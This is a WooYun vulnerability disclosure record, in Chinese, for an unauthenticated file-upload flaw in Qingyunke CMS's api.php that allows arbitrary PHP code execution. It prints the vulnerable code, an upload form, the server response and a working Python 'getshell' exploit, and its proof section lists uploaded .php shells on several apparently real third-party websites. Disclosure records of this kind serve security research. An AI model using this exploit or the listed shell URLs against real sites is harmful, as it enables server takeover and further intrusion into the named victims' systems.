{"id": 73175, "wybug_id": "wooyun-2015-0155042", "wybug_title": "青云客CMS前台任意代码执行", "wybug_corp": "青云客", "wybug_author": "c26", "wybug_date": "2015-11-23 15:42", "wybug_open_date": "2016-01-11 15:32", "wybug_type": "", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-23：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2016-01-11：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 前台任意代码执行 详细说明：  \napi.php\n\n<?phpini_set(\"max_execution_time\",\"1800\");include('include/config.php');include('include/function.php');include('include/class_mysql.php');nocache();$tcz=array('log'=>arg('log','all','url'));$db=new mysql();switch($tcz['log']){\t...\tcase 'feedback_upload':\t\t@$webdomain=$_SERVER['SERVER_NAME'];\t\t$website=db_getshow('website','*','setup_weburl=\"'.$webdomain.'\"');\t\techo $website['webid'];\t\tif(!$website){\t\t\tdie('error');\t\t\texit;\t\t\t}\t\tif($_FILES[\"file\"][\"error\"]>0){\t\t\techo '<script type=\"text/javascript\">parent.PZ.sendfeedback_upload({log:\"success\",msg:\"error1\"});</script>';\t\t\texit;\t\t}else{\t\t\t$fsize=$_FILES['file']['size']/1024;\t\t\tif($fsize>5120){\t\t\t\techo '<script type=\"text/javascript\">parent.PZ.sendfeedback_upload({log:\"success\",msg:\"error2\"});</script>';\t\t\t\texit;\t\t\t\t}\t\t\t// 获取扩展名\t\t\t$typename=strtolower(pathinfo($_FILES['file']['name'],PATHINFO_EXTENSION));\t\t\t// 组合文件名\t\t\t$filename=date('dHis').'_'.randomkeys(6).'.'.$typename;\t\t\t// 组合路径\t\t\t$path=setup_upfolder.$website['webid'].'/'.setup_uptemp.$filename; \t\t\t// shell\t\t\tmove_uploaded_file($_FILES['file']['tmp_name'],$path);\t\t\techo '<script type=\"text/javascript\">parent.PZ.sendfeedback_upload({log:\"success\",file:\"'.$filename.'\"});</script>';\t\t\t}\tbreak;\tdefault:\t\t$url=$_SERVER[\"QUERY_STRING\"];\t\tif($url!=''){\t\t\t$url=preg_replace('/^\\//','',$url);\t\t\tgotourl($url);\t\t\t}\tbreak;\t}?>\n前面直接引入了配置文件、方法封装、操作类文件，没有做其他验证,跟进查看 arg\nfunction arg($aname='log',$gtype='post',$atype='string',$len=0){$val='';switch($gtype){\tcase \"get\":\t\t@$val=$_GET[$aname];\tbreak;\tcase \"post\":\t\t@$val=$_POST[$aname];\tbreak;\tcase \"all\":\t\t@$val=$_GET[$aname];\t\tif($val=='')@$val=$_POST[$aname];\tbreak;\t}switch($atype){\tcase 'int':\t\tif($val=='')$val='0';\t\t$val=sprintf('%.0f',$val);\tbreak;\tcase 'num':\t\t$val=floatval($val);\t\tif($val<1)$val=1;\tbreak;\tcase 'url':\t\t$val=trim($val);\t\tStopAttack($aname,$val,$gtype);\t\t$val=urldecode($val);\tbreak;\tcase 'txt':\t\t$val=trim($val);\t\tStopAttack($aname,$val,$gtype);\t\t$val=urldecode($val);\t\t$val=htmlspecialchars($val);\tbreak;\tcase 'rate':\t\t$val=urldecode($val);\t\tif($val=='')$val=0;\t\t$val=(float)$val;\t\t$val=sprintf('%.4f',$val);\tbreak;\tcase 'decimal':\t\t$val=urldecode($val);\t\tif($val=='')$val=0;\t\t$val=(float)$val;\t\t$val=sprintf('%.'.goif($len,$len,2).'f',$val);\tbreak;\tcase 'none':\tbreak;\tdefault:\t\tStopAttack($aname,$val,$gtype);\t\t$val=htmlspecialchars($val);\tbreak;\t}return $val;}\n根据构造表单\n<form action=\"http://app.com/api.php?log=feedback_upload\" method=\"post\" enctype=\"multipart/form-data\"><input type=\"file\" name=\"file\"><br><br><input type=\"submit\" value=\"upload\"></form>\nResponse:\n﻿10001<script type=\"text/javascript\">parent.PZ.sendfeedback_upload({log:\"success\",file:\"22170707_shhxyo.php\"});</script>\n附上Exploit:\n#!/usr/bin/env python#coding=utf-8import requestsimport redef getshell(host):\tif not host.startswith('http://') and not host.startswith('https://'):\t\turl = 'http://' + host\telse:\t\turl = host\tfiles = {'file': ('x.php', open('e:\\\\ma\\\\php\\\\phpinfo.txt', 'rb'), 'image/png')}\treq = requests.post(url + '/api.php?log=feedback_upload', files = files)\tmatch = re.search(r'(\\d{5}).*file:\"(.*\\.php)\"', req.content)\tif match.group(1) and match.group(2):\t\tshell = '%s/upload/%s/temp/%s'%(url, match.group(1), match.group(2))\t\treq = requests.get(shell)\t\tif req.status_code == 200:\t\t\tprint shell\telse:\t\tprint match.group()if __name__ == '__main__':\tgetshell('http://app.com/')\n\n\n   漏洞证明：  \nhttp://fffyun.com//upload/10001/temp/22171802_kmvz96.phphttp://www.855m.com//upload/10001/temp/22171830_b9d5i1.phphttp://www.shuguangcm.com//upload/10001/temp/22171842_ztds2l.phphttp://www.xi7.net//upload/10001/temp/22131216_74zy6n.phphttp://weng8.com//upload/10001/temp/22171915_5o9n34.phphttp://www.jqr666.com//upload/10001/temp/22172116_633occ.phphttp://ihbhc.com//upload/10001/temp/22172133_vn4zc2.php...\n   修复方案：     版权声明：转载请注明来源 c26@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：15 (WooYun评价)  ", "replys": "漏洞评价：\n评价\n     2015-11-23 15:50 |    \t\tking7 \t\t\t( 普通白帽子  |\t\t\t        Rank:1593 漏洞数:230        | 闭关修炼易筋经)\t\t \n  这是90那个洞？    \n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 15, "Ranks": null}